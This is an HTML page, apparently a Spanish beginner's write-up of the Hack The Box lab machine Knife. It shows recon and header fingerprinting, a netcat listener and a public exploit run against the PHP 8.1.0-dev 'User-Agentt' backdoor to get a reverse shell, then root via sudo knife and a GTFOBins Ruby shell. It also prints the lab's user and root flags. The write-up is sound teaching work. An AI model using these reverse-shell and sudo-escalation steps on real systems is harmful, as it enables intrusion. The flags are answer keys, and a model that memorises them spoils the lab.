@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#0b0a1a">
+<meta name="author" content="Sebastián Latorre Muñoz">
+<title>Knife · HTB · Guía para principiantes // iphobiuss</title>
+<meta name="description" content="Writeup y guía para principiantes de la máquina Knife (Hack The Box): fingerprinting de PHP por cabeceras HTTP, backdoor PHP 8.1.0-dev (User-Agentt), reverse shell y escalada por sudo con GTFOBins. Por Sebastián Latorre Muñoz (iphobiuss).">
+<link rel="canonical" href="https://iphobiuss.github.io/knife.html">
+<meta property="og:title" content="Knife · HTB · Guía para principiantes">
+<meta property="og:description" content="Fingerprinting por cabeceras, backdoor de PHP 8.1.0-dev, reverse shell y escalada por sudo, paso a paso y razonado.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://iphobiuss.github.io/knife.html">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' shape-rendering='crispEdges'%3E%3Crect width='24' height='24' fill='%230b0a1a'/%3E%3Cg fill='%2339ff14'%3E%3Crect x='8' y='3' width='8' height='2'/%3E%3Crect x='7' y='5' width='2' height='4'/%3E%3Crect x='15' y='5' width='2' height='4'/%3E%3Crect x='5' y='9' width='14' height='12'/%3E%3C/g%3E%3Cg fill='%230b0a1a'%3E%3Crect x='11' y='12' width='2' height='4'/%3E%3Crect x='10' y='16' width='4' height='2'/%3E%3C/g%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=IBM+Plex+Mono:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0b0a1a; --bg2:#12102a; --panel:#0f0d24;
+    --ink:#d3d1ef; --dim:#9c97c9; --line:#2a2350;
+    --green:#39ff14; --magenta:#ff2a6d; --cyan:#05d9e8; --amber:#ffd319; --violet:#b967ff;
+    --shadow:6px 6px 0 #000;
+  }
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto;}}
+  body{margin:0;background:var(--bg);color:var(--ink);
+    font-family:'IBM Plex Mono','JetBrains Mono',monospace;font-size:15px;line-height:1.55;overflow-x:hidden;
+    background-image:radial-gradient(circle at 50% -10%, #1a1640 0%, var(--bg) 55%);}
+  .crt{position:fixed;inset:0;pointer-events:none;z-index:9000;}
+  .crt::before{content:"";position:absolute;inset:0;
+    background:repeating-linear-gradient(0deg,rgba(0,0,0,0) 0,rgba(0,0,0,0) 2px,rgba(0,0,0,.12) 3px,rgba(0,0,0,.12) 4px);}
+  .crt::after{content:"";position:absolute;inset:0;
+    background:radial-gradient(ellipse at center,transparent 62%,rgba(0,0,0,.5) 100%);}
+  @keyframes flick{0%,100%{opacity:.98}50%{opacity:1}}
+  @media (prefers-reduced-motion:no-preference){.crt{animation:flick 5s infinite steps(2);}}
+
+  .pixel{font-family:'Press Start 2P',monospace;}
+  .mono{font-family:'JetBrains Mono',monospace;}
+  a{color:var(--cyan);text-decoration:none;} a:hover{text-decoration:underline;}
+  ::selection{background:var(--green);color:#000;}
+  :focus-visible{outline:2px solid var(--green);outline-offset:2px;}
+
+  .topbar{position:sticky;top:0;z-index:100;}
+  nav{display:flex;align-items:center;gap:16px;
+    padding:12px 20px;background:var(--bg2);border-bottom:3px solid var(--line);
+    font-family:'IBM Plex Mono';font-weight:600;font-size:12px;letter-spacing:.04em;flex-wrap:wrap;}
+  nav .brand{color:var(--green);} nav .brand b{color:#fff;}
+  nav .links{display:flex;gap:13px;margin-left:auto;flex-wrap:wrap;}
+  nav .links a{color:var(--amber);} nav .links a:hover{color:#fff;text-decoration:none;}
+
+  .wrap{max-width:1040px;margin:0 auto;padding:0 22px;}
+
+  /* HERO */
+  header{padding:54px 22px 26px;}
+  .hero{max-width:1040px;margin:0 auto;}
+  .prompt{font-family:'JetBrains Mono';font-size:15px;color:var(--dim);margin-bottom:14px;}
+  .prompt .g{color:var(--green);} .prompt .c{color:var(--cyan);}
+  .hero h1{font-family:'Press Start 2P';font-size:clamp(20px,5vw,38px);color:#fff;margin:0 0 16px;
+    line-height:1.4;text-shadow:0 0 6px rgba(57,255,20,.35),4px 4px 0 rgba(0,0,0,.6);}
+  .meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:18px;}
+  .badge{font-family:'Press Start 2P';font-size:8px;padding:7px 9px;border:2px solid var(--line);
+    background:var(--panel);box-shadow:3px 3px 0 #000;}
+  .badge.b1{color:var(--green);border-color:var(--green);}
+  .badge.b2{color:var(--cyan);border-color:var(--cyan);}
+  .badge.b3{color:var(--amber);border-color:var(--amber);}
+  .badge.b4{color:var(--magenta);border-color:var(--magenta);}
+  .badge.b5{color:var(--violet);border-color:var(--violet);}
+  .pitch{font-family:'IBM Plex Mono';font-size:14.5px;line-height:1.7;color:var(--ink);margin:16px 0 0;max-width:70ch;}
+  .pitch b{color:var(--amber);}
+
+  /* CHAIN badges */
+  .chain{display:flex;flex-wrap:wrap;gap:0;align-items:stretch;margin:26px auto 0;max-width:1040px;}
+  .chain .lnk{flex:1;min-width:140px;background:var(--panel);border:2px solid var(--line);
+    border-top:4px solid var(--acc,var(--green));padding:11px 13px;box-shadow:4px 4px 0 #000;margin:0 8px 8px 0;}
+  .chain .lnk .n{font-family:'Press Start 2P';font-size:8px;color:var(--acc,var(--green));margin-bottom:7px;}
+  .chain .lnk .t{font-size:13px;color:var(--ink);line-height:1.4;}
+  .chain .lnk .t b{color:#fff;font-weight:400;}
+
+  /* INTRO / callouts */
+  .intro{max-width:1040px;margin:28px auto 0;padding:0 22px;color:var(--ink);font-size:15.5px;line-height:1.62;}
+  .intro b{color:var(--amber);}
+  .intro .mono{font-size:.9em;background:#060512;border:1px solid var(--line);padding:1px 6px;color:var(--cyan);}
+
+  /* SECTIONS */
+  section{padding:48px 0 10px;border-top:3px solid var(--line);margin-top:42px;}
+  .sec-head{display:flex;align-items:baseline;gap:14px;flex-wrap:wrap;margin-bottom:6px;}
+  .sec-id{font-family:'Press Start 2P';font-size:20px;color:var(--acc);}
+  .sec-name{font-family:'Press Start 2P';font-size:clamp(12px,3.2vw,17px);color:#fff;margin:0;font-weight:400;line-height:1.5;}
+  .sec-focus{font-size:15px;color:var(--acc);margin:6px 0 22px;}
+  .sec-focus::before{content:"▸ ";}
+
+  h3.step{font-family:'IBM Plex Mono';font-weight:700;font-size:14px;color:#fff;
+    letter-spacing:.03em;margin:24px 0 10px;padding-left:12px;border-left:4px solid var(--acc,var(--cyan));}
+  p.f{font-size:15px;line-height:1.64;margin:0 0 14px;color:var(--ink);}
+  p.f b{color:#fff;}
+  .why{border-left:3px solid var(--amber);background:rgba(255,211,25,.05);padding:12px 15px;margin:0 0 14px;font-size:14.5px;line-height:1.6;}
+  .why b{font-family:'IBM Plex Mono';font-weight:700;font-size:11px;letter-spacing:.06em;color:var(--amber);display:block;margin-bottom:6px;}
+
+  .cmdlabel{font-family:'IBM Plex Mono';font-weight:700;font-size:11px;letter-spacing:.06em;color:var(--cyan);margin:12px 0 8px;}
+  pre{font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.65;
+    background:#060512;border:2px solid var(--line);color:#d7f7d0;
+    padding:13px 15px;overflow-x:auto;margin:0 0 12px;}
+  pre .cmt{color:#8a84bd;} pre .k{color:var(--cyan);} pre .o{color:var(--amber);}
+  code.ic{background:#060512;border:1px solid var(--line);padding:1px 6px;color:var(--cyan);font-size:.9em;}
+
+  /* fundamento card */
+  .fcard{background:var(--panel);border:2px solid var(--line);border-left:5px solid var(--violet);
+    padding:16px 18px;margin:0 0 14px;box-shadow:4px 4px 0 #000;}
+  .fcard h4{font-family:'IBM Plex Mono';font-weight:700;font-size:14px;color:var(--violet);margin:0 0 10px;line-height:1.5;}
+  .fcard p{margin:0 0 10px;font-size:15px;line-height:1.6;}
+  .fcard p:last-child{margin-bottom:0;}
+  .fcard.cyan{border-left-color:var(--cyan);} .fcard.cyan h4{color:var(--cyan);}
+  .fcard.green{border-left-color:var(--green);} .fcard.green h4{color:var(--green);}
+  .fcard.amber{border-left-color:var(--amber);} .fcard.amber h4{color:var(--amber);}
+
+  /* tables */
+  .tblwrap{overflow-x:auto;margin:0 0 14px;}
+  table{border-collapse:collapse;width:100%;font-size:13.5px;background:var(--panel);box-shadow:4px 4px 0 #000;}
+  th,td{border:1px solid var(--line);padding:9px 12px;text-align:left;vertical-align:top;line-height:1.5;}
+  th{font-family:'IBM Plex Mono';font-weight:700;font-size:11px;letter-spacing:.05em;color:var(--cyan);background:#060512;}
+  td code,th code{background:#060512;border:1px solid var(--line);padding:1px 5px;color:var(--cyan);font-size:12px;}
+  td b{color:#fff;}
+  .ans{color:var(--green);font-weight:700;}
+
+  .warn{border:3px dashed var(--magenta);background:rgba(255,42,109,.06);
+    padding:16px 18px;margin:34px 0;color:var(--magenta);font-size:14.5px;line-height:1.55;}
+  .warn b{font-family:'IBM Plex Mono';font-weight:700;font-size:12px;letter-spacing:.04em;display:block;margin-bottom:8px;}
+  .warn .mono{color:var(--amber);}
+
+  .takeaways{list-style:none;padding:0;margin:6px 0 0;}
+  .takeaways li{background:var(--panel);border:1px solid var(--line);border-left:4px solid var(--green);
+    padding:11px 14px;margin:0 0 9px;font-size:14.5px;line-height:1.55;}
+  .takeaways li b{color:var(--green);}
+
+  footer{border-top:3px solid var(--line);margin-top:44px;padding:34px 22px 60px;text-align:center;
+    font-family:'IBM Plex Mono';font-weight:600;font-size:11px;letter-spacing:.03em;color:var(--dim);line-height:2.4;}
+  footer .g{color:var(--green);} footer a{color:var(--cyan);display:inline-block;padding:5px 7px;}
+
+  .skip{position:absolute;left:8px;top:-52px;z-index:200;background:var(--green);color:#000;
+    padding:9px 15px;font-family:'IBM Plex Mono';font-weight:700;font-size:13px;border:2px solid #000;transition:top .12s;}
+  .skip:focus{top:8px;text-decoration:none;}
+
+  @media (max-width:640px){
+    nav{flex-wrap:nowrap;gap:0;padding:0 14px;overflow-x:auto;scrollbar-width:none;}
+    nav::-webkit-scrollbar{display:none;}
+    nav .brand{flex-shrink:0;padding:13px 16px 13px 0;}
+    nav .links{flex-wrap:nowrap;margin-left:0;gap:0;}
+    nav .links a{padding:13px 9px;white-space:nowrap;}
+  }
+
+  /* impresión / guardar como PDF: legible en blanco, sin cromo */
+  @media print{
+    .crt,.topbar,.skip{display:none!important;}
+    body{background:#fff!important;background-image:none!important;font-size:11pt;}
+    *{box-shadow:none!important;text-shadow:none!important;color:#111!important;
+      background:transparent!important;border-color:#bbb!important;}
+    a{text-decoration:underline;}
+    pre{background:#f3f3f3!important;border:1px solid #ccc!important;white-space:pre-wrap;word-break:break-word;}
+    pre .cmt,pre .k,pre .o{color:#555!important;}
+    table{background:#fff!important;} th{background:#eee!important;}
+    .badge,.fcard,.warn,.chain .lnk,pre,table,.why,.takeaways li{break-inside:avoid;}
+    .ans{color:#111!important;}
+  }
+</style>
+</head>
+<body>
+<a class="skip" href="#contenido">Saltar al contenido</a>
+<div class="crt"></div>
+
+<div class="topbar">
+<nav aria-label="Navegación">
+  <span class="brand"><b>iphobiuss</b>::offsec</span>
+  <span class="links">
+    <a href="index.html">← KNOWLEDGE BASE</a>
+    <a href="cap.html">CAP</a>
+    <a href="#recon">RECON</a><a href="#fingerprint">FINGERPRINT</a><a href="#rce">RCE</a>
+    <a href="#access">ACCESO</a><a href="#privesc">PRIVESC</a><a href="#tasks">TASKS</a><a href="#takeaways">TAKEAWAYS</a>
+  </span>
+</nav>
+</div>
+
+<main id="contenido">
+<header>
+  <div class="hero">
+    <div class="prompt mono"><span class="g">iphobiuss@offsec</span>:<span class="c">~</span>$ ./pwn --box knife --mode guided</div>
+    <h1 class="pixel">KNIFE</h1>
+    <div class="meta">
+      <span class="badge b1">HTB</span>
+      <span class="badge b2">LINUX</span>
+      <span class="badge b3">EASY</span>
+      <span class="badge b4">RCE</span>
+      <span class="badge b5">SUDO</span>
+    </div>
+    <p class="pitch">Guía para principiantes de la máquina <b>Knife</b> de Hack The Box, la <b>#2</b> de la serie. Da por sabido lo de <a href="cap.html">Cap</a> y suma capas nuevas: <b>fingerprinting por cabeceras HTTP</b>, explotar una versión con <b>backdoor</b>, montar una <b>reverse shell</b> sin credenciales, y escalar por <b>sudo</b>. Como siempre: no solo los comandos, sino por qué se decide cada paso.</p>
+
+    <div class="chain">
+      <div class="lnk" style="--acc:var(--cyan)"><div class="n">01</div><div class="t"><b>RECON</b><br>nmap · 2 puertos</div></div>
+      <div class="lnk" style="--acc:var(--amber)"><div class="n">02</div><div class="t"><b>FINGERPRINT</b><br>curl -I → PHP 8.1.0-dev</div></div>
+      <div class="lnk" style="--acc:var(--magenta)"><div class="n">03</div><div class="t"><b>RCE</b><br>backdoor · User-Agentt</div></div>
+      <div class="lnk" style="--acc:var(--green)"><div class="n">04</div><div class="t"><b>ACCESO</b><br>reverse shell → james</div></div>
+      <div class="lnk" style="--acc:var(--violet)"><div class="n">05</div><div class="t"><b>PRIVESC</b><br>sudo knife → root</div></div>
+    </div>
+  </div>
+</header>
+
+<div class="intro">
+  <b>Requisitos:</b> los mismos de <a href="cap.html">Cap</a> — cuenta HTB (VIP para retiradas), Kali funcionando, y la VPN levantada. Si es tu primer writeup, empieza por la guía de Cap: aquí no repito el flujo básico, lo doy por hecho.
+  <br><br>
+  <b>Lección de esta máquina, ya en la conexión:</b> una VPN a la vez. Si levantas una segunda sin cerrar la primera, Linux crea <span class="mono">tun1</span> (porque <span class="mono">tun0</span> sigue ocupada) y verás errores <span class="mono">route ... File exists</span>. Antes de conectar otra VPN, mata la anterior con <span class="mono">sudo pkill openvpn</span> y reconecta: así vuelves a un <span class="mono">tun0</span> limpio.
+</div>
+
+<!-- ===================== RECON ===================== -->
+<section id="recon" style="--acc:var(--cyan)">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">01 · RECONOCIMIENTO</h2></div>
+    <div class="sec-focus">Menos puertos que en Cap: la decisión de entrada es aún más clara.</div>
+
+    <pre><span class="k">mkdir</span> -p ~/htb/knife/nmap &amp;&amp; <span class="k">cd</span> ~/htb/knife
+<span class="k">nmap</span> -p- --min-rate 1000 -oA nmap/allports 10.129.62.139</pre>
+    <pre>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</pre>
+    <p class="f">Dos puertos. Mismo razonamiento que Cap: <b>SSH (22)</b> pide credenciales que no tienes → puerta cerrada con llave, se descarta como entrada inicial. <b>HTTP (80)</b> es la única superficie explorable. Con solo dos puertas y una cerrada, la decisión no admite duda: <b>se empieza por HTTP</b>.</p>
+    <div class="why"><b>DATO DEL PING</b>Un <code class="ic">ttl=63</code> en la respuesta al ping sugiere una máquina Linux (los TTL de Linux parten en 64 y bajan 1 por salto). Pista temprana, se confirma luego con el fingerprint.</div>
+  </div>
+</section>
+
+<!-- ===================== FINGERPRINT ===================== -->
+<section id="fingerprint" style="--acc:var(--amber)">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">02 · FINGERPRINTING</h2></div>
+    <div class="sec-focus">Cuando la web no da nada a la vista, mira lo que hay por debajo.</div>
+
+    <h3 class="step">La web no muestra nada obvio</h3>
+    <p class="f">Abres <code class="ic">http://10.129.62.139</code> en Firefox y ves una página de empresa médica ficticia (<em>EMA — Emergent Medical Idea</em>): puro texto, los enlaces de arriba no hacen nada, sin funciones visibles. A simple vista no hay qué explotar.</p>
+    <div class="why"><b>EL GIRO RESPECTO A CAP</b>En Cap la web te mostraba todo a la vista. Aquí no. Cuando una web no da nada obvio, el pentester no se rinde: mira <b>cómo está construido el servidor</b> — qué tecnología y qué versiones corre. Esa info no se ve en la página, pero el servidor la anuncia en las cabeceras HTTP.</div>
+
+    <h3 class="step">Inspeccionar las cabeceras HTTP</h3>
+    <p class="f">Cada respuesta web trae "cabeceras": metadatos invisibles que a veces revelan el software y sus versiones. Es como leer la etiqueta de fabricación. Desde la terminal, sin navegador:</p>
+    <pre><span class="k">curl</span> -I http://10.129.62.139</pre>
+    <p class="f"><code class="ic">curl</code> hace peticiones web desde la consola; <code class="ic">-I</code> pide <b>solo las cabeceras</b>, no el contenido.</p>
+    <pre>HTTP/1.1 200 OK
+Server: Apache/2.4.41 (Ubuntu)
+<span class="o">X-Powered-By: PHP/8.1.0-dev</span>
+Content-Type: text/html; charset=UTF-8</pre>
+    <p class="f"><code class="ic">Server: Apache/2.4.41 (Ubuntu)</code> confirma Ubuntu/Linux. Y la joya: <code class="ic">X-Powered-By: PHP/8.1.0-dev</code>.</p>
+
+    <div class="why"><b>REFLEJO CLAVE DEL OFICIO</b>El sufijo <b><code class="ic">-dev</code></b> es una versión de <em>desarrollo</em>, no de producción. Cuando encuentras una versión específica y rara (<code class="ic">-dev</code>, <code class="ic">beta</code>, <code class="ic">RC</code>…), la siguiente pregunta es SIEMPRE: <b>¿esta versión tiene una vulnerabilidad pública conocida?</b> Una versión de desarrollo en producción es una bandera roja: puede traer código que nunca debió publicarse.</div>
+  </div>
+</section>
+
+<!-- ===================== RCE ===================== -->
+<section id="rce" style="--acc:var(--magenta)">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">03 · LA VULNERABILIDAD</h2></div>
+    <div class="sec-focus">Versión rara → buscar CVE → leer cómo funciona. La habilidad central.</div>
+
+    <div class="fcard amber">
+      <h4>▚ El backdoor de PHP 8.1.0-dev</h4>
+      <p>Buscando <code class="ic">PHP 8.1.0-dev exploit</code> (en Google o en <a href="https://www.exploit-db.com/" target="_blank" rel="noopener">Exploit-DB</a>) se descubre que en <b>2021</b> el repositorio de código de PHP fue comprometido: unos atacantes inyectaron un <b>backdoor</b> en el código fuente, que quedó en esa versión de desarrollo.</p>
+      <p>El backdoor (apodado <b>zerodiumvar_dump</b>) se dispara cuando el servidor recibe una <b>cabecera HTTP con un nombre concreto</b>, y ejecuta como comando lo que venga en ella. Ese nombre es <b><code class="ic">User-Agentt</code></b> — con <b>doble T</b>, no es una errata. Se disfrazó a propósito para parecerse a la cabecera legítima <code class="ic">User-Agent</code> y pasar desapercibida.</p>
+    </div>
+
+    <h3 class="step">Conseguir y leer el exploit</h3>
+    <p class="f">Las referencias apuntan a un exploit ya escrito en Python (repo de <em>flast101</em>). Se clona y — regla de oro — <b>se lee antes de ejecutar</b>: nunca dispares un exploit a ciegas.</p>
+    <pre><span class="k">git</span> clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce.git
+<span class="k">cd</span> php-8.1.0-dev-backdoor-rce
+<span class="k">cat</span> revshell_php_8.1.0-dev.py</pre>
+    <p class="f">Dentro del script se ve materializado todo lo investigado: manda la cabecera <code class="ic">User-Agentt</code> con <code class="ic">zerodiumsystem('...')</code> y dentro un <em>payload</em> de reverse shell. También comprueba primero que el server corra <code class="ic">PHP/8.1.0-dev</code> antes de atacar. Su uso:</p>
+    <pre>python3 revshell_php_8.1.0-dev.py &lt;target-ip&gt; &lt;attacker-ip&gt; &lt;attacker-port&gt;</pre>
+  </div>
+</section>
+
+<!-- ===================== ACCESO ===================== -->
+<section id="access" style="--acc:var(--green)">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">04 · ACCESO · REVERSE SHELL</h2></div>
+    <div class="sec-focus">Un método de acceso sin credenciales, distinto al SSH de Cap.</div>
+
+    <div class="fcard green">
+      <h4>▚ ¿Qué es una reverse shell?</h4>
+      <p>Una técnica para conseguir una terminal de la víctima <b>cuando no tienes credenciales</b>. Al revés de lo intuitivo: en vez de que <em>tú te conectes</em> a la víctima (como el SSH de Cap), haces que <b>la víctima se conecte a ti</b>.</p>
+      <p>Tú te pones "a la escucha" en tu Kali; luego, vía el backdoor, ordenas a la víctima que te <b>llame de vuelta</b> y te entregue una shell. Lo que necesita saber de ti no son credenciales, sino <b>tu IP y un puerto</b> — como un número de teléfono, no una contraseña.</p>
+    </div>
+
+    <h3 class="step">1 · Ponte a la escucha (listener)</h3>
+    <p class="f">En una terminal, espera la conexión entrante con netcat. Queda "colgada" escuchando — es correcto, no la cierres.</p>
+    <pre><span class="k">nc</span> -lvnp 4444</pre>
+    <p class="f"><code class="ic">-l</code> listen · <code class="ic">-v</code> verbose · <code class="ic">-n</code> sin DNS · <code class="ic">-p 4444</code> puerto (el mismo que le pasarás al exploit).</p>
+
+    <h3 class="step">2 · Dispara el exploit</h3>
+    <p class="f">Confirma tu IP de <code class="ic">tun0</code> (<code class="ic">ip a show tun0</code>) — error clásico: pasar la IP de eth0 en vez de la de la VPN, y la shell nunca llega. Orden: <b>URL víctima → tu IP → tu puerto</b>.</p>
+    <pre><span class="k">python3</span> revshell_php_8.1.0-dev.py http://10.129.62.139 10.10.14.57 4444</pre>
+    <p class="f">La magia ocurre en la terminal del <b>netcat</b>: cae la conexión y aparece un prompt nuevo.</p>
+    <pre>connect to [10.10.14.57] from (UNKNOWN) [10.129.62.139] 45772
+james@knife:/$</pre>
+    <p class="f">Los avisos <code class="ic">no job control in this shell</code> <b>no son errores</b>: es una shell básica. El prompt <code class="ic">james@knife</code> ya te dice el usuario del servidor web.</p>
+
+    <h3 class="step">3 · Estabiliza la shell</h3>
+    <p class="f">Truco que usarás en cada reverse shell: convertir la shell básica en una más funcional (prompt completo).</p>
+    <pre><span class="k">python3</span> -c 'import pty; pty.spawn("/bin/bash")'</pre>
+
+    <h3 class="step">4 · User flag</h3>
+    <pre><span class="k">whoami</span>            <span class="cmt"># -&gt; james</span>
+<span class="k">cat</span> /home/james/user.txt   <span class="cmt"># -&gt; bf5dfa0cc747705d9ec81c5ecf28b79c</span></pre>
+    <div class="why"><b>SEÑAL DE CONFIG DESCUIDADA</b>El servidor web corre como <code class="ic">james</code>, un usuario <em>personal</em>, no de servicio. Por eso pudiste leer directo su <code class="ic">user.txt</code> (permisos <code class="ic">-r--------</code>, solo de james). En una config correcta el web server no correría como un usuario real.</div>
+  </div>
+</section>
+
+<!-- ===================== PRIVESC ===================== -->
+<section id="privesc" style="--acc:var(--violet)">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">05 · ESCALADA POR SUDO</h2></div>
+    <div class="sec-focus">El vector de privesc más común del mundo real. Complementa las capabilities de Cap.</div>
+
+    <div class="fcard">
+      <h4>▚ ¿Qué es sudo (y por qué se abusa)?</h4>
+      <p><code class="ic">sudo</code> permite a un usuario ejecutar algo <b>como otro usuario</b> (normalmente root), si el administrador lo autorizó. La mina de oro aparece cuando esa autorización está <b>mal hecha</b>: si te dejan correr como root un programa que se puede "abusar", puedes escalar a root.</p>
+    </div>
+
+    <h3 class="step">Preguntar qué te permite sudo</h3>
+    <pre><span class="k">sudo</span> -l</pre>
+    <pre>User james may run the following commands on knife:
+    (root) NOPASSWD: <span class="o">/usr/bin/knife</span></pre>
+    <p class="f">Lectura: <code class="ic">(root)</code> lo corres como root · <code class="ic">NOPASSWD</code> sin contraseña (por eso <code class="ic">sudo -l</code> funcionó sin la clave de james) · <code class="ic">/usr/bin/knife</code> el binario. Ese es el boleto — y la razón del nombre de la máquina.</p>
+
+    <h3 class="step">Qué es knife, y GTFOBins</h3>
+    <p class="f"><code class="ic">knife</code> es la CLI de <b>Chef</b>, una plataforma de gestión de configuración. Lo relevante: <b>knife puede ejecutar código Ruby</b>. El mismo patrón letal de Cap: un binario que corre como root y ejecuta código que tú le das.</p>
+    <div class="why"><b>ENCADENAR GTFOBins</b>Como en Cap: binario poco común en <code class="ic">sudo -l</code> → búscalo en <a href="https://gtfobins.github.io/gtfobins/knife/" target="_blank" rel="noopener">GTFOBins</a>, sección <b>Sudo</b> (usa la sección de TU permiso). La entrada de <code class="ic">knife</code> muestra <code class="ic">knife exec -E '...'</code> y dice <em>"inherits from ruby"</em>: para el código a inyectar, ve a la página de <b>ruby</b> → sección <b>Shell</b>, que da <code class="ic">exec "/bin/sh"</code>.</div>
+
+    <h3 class="step">Armar el comando y saltar a root</h3>
+    <p class="f">Combinas la cáscara de knife con el Ruby de ruby, con <code class="ic">sudo</code> delante:</p>
+    <pre><span class="k">sudo</span> knife exec -E 'exec "/bin/sh"'
+<span class="k">whoami</span>   <span class="cmt"># -&gt; root</span>
+<span class="k">id</span>       <span class="cmt"># -&gt; uid=0(root) gid=0(root) groups=0(root)</span></pre>
+    <p class="f">El prompt cambia a <code class="ic">#</code>. Lógica idéntica a Cap: sudo corre knife como root → knife ejecuta el Ruby → el Ruby lanza una shell → como todo corre como root, la shell es de root.</p>
+
+    <h3 class="step">Root flag</h3>
+    <pre><span class="k">cat</span> /root/root.txt   <span class="cmt"># -&gt; 67d2dd2560757b41cd5019a89a441df5</span></pre>
+    <p class="f"><b>Máquina comprometida por completo.</b> 🏴‍☠️</p>
+  </div>
+</section>
+
+<!-- ===================== TASKS ===================== -->
+<section id="tasks" style="--acc:var(--amber)">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">TASKS · GUIDED MODE</h2></div>
+    <div class="sec-focus">Las flags son de una instancia concreta. En tu máquina serán distintas.</div>
+    <div class="tblwrap"><table>
+      <tr><th>Task</th><th>Respuesta</th></tr>
+      <tr><td>¿Qué versión de PHP corre el servidor web?</td><td class="ans">PHP 8.1.0-dev</td></tr>
+      <tr><td>¿Qué cabecera HTTP da ejecución de código en esta versión?</td><td class="ans">User-Agentt</td></tr>
+      <tr><td>¿Como qué usuario corre el servidor web?</td><td class="ans">james</td></tr>
+      <tr><td>Ruta completa del binario que james ejecuta como root</td><td class="ans">/usr/bin/knife</td></tr>
+      <tr><td>User flag</td><td><code>bf5dfa0cc747705d9ec81c5ecf28b79c</code></td></tr>
+      <tr><td>Root flag</td><td><code>67d2dd2560757b41cd5019a89a441df5</code></td></tr>
+    </table></div>
+  </div>
+</section>
+
+<!-- ===================== TAKEAWAYS ===================== -->
+<section id="takeaways" style="--acc:var(--green)">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">CONCEPTOS NUEVOS (vs CAP)</h2></div>
+    <div class="sec-focus">Knife no repite Cap: lo extiende. Esto es lo que suma a tu arsenal.</div>
+    <ul class="takeaways">
+      <li><b>Una VPN a la vez:</b> mata la anterior (<code class="ic">sudo pkill openvpn</code>) antes de levantar otra, o acabas en <code class="ic">tun1</code> con rutas duplicadas.</li>
+      <li><b>Fingerprinting por cabeceras:</b> <code class="ic">curl -I</code> revela servidor, SO y versiones cuando la web no muestra nada a la vista.</li>
+      <li><b>Versión rara → CVE:</b> <code class="ic">-dev</code>/<code class="ic">beta</code>/<code class="ic">RC</code> = bandera roja. Reflejo: buscar vulnerabilidad pública conocida.</li>
+      <li><b>Leer el exploit antes de lanzarlo:</b> entender qué hace (el <code class="ic">User-Agentt</code>, el payload) es lo que separa entender de copiar.</li>
+      <li><b>Reverse shell:</b> acceso <em>sin credenciales</em>. Listener (<code class="ic">nc -lvnp</code>) + la víctima te llama de vuelta a tu <b>IP + puerto</b>.</li>
+      <li><b>Estabilizar la shell:</b> <code class="ic">python3 -c 'import pty; pty.spawn("/bin/bash")'</code> convierte una shell básica en una usable.</li>
+      <li><b>Escalada por <code class="ic">sudo -l</code>:</b> el vector de privesc más común del mundo real. <code class="ic">NOPASSWD</code> es regalo.</li>
+      <li><b>Encadenar GTFOBins:</b> knife hereda de ruby — seguir esa pista hasta el comando final, usando la sección del permiso correcto (Sudo).</li>
+    </ul>
+  </div>
+</section>
+</main>
+
+<footer>
+  <div><span class="g">iphobiuss@offsec</span>:~$ <span class="mono">echo "de la cabecera olvidada al root: cada capa, un reflejo nuevo."</span></div>
+  <div>Knife · Hack The Box · máquina retirada · guía para principiantes · #2 de la serie</div>
+  <div>
+    <a href="index.html">Knowledge base</a> ·
+    <a href="cap.html">← Cap</a> ·
+    <a href="https://github.com/iphobiuss" target="_blank" rel="noopener">GitHub</a> ·
+    <a href="https://www.linkedin.com/in/sebastian-latorre-munoz/" target="_blank" rel="noopener">LinkedIn</a>
+  </div>
+  <div class="rev">Sebastián Latorre Muñoz · Santiago, CL</div>
+</footer>
+</body>
+</html>
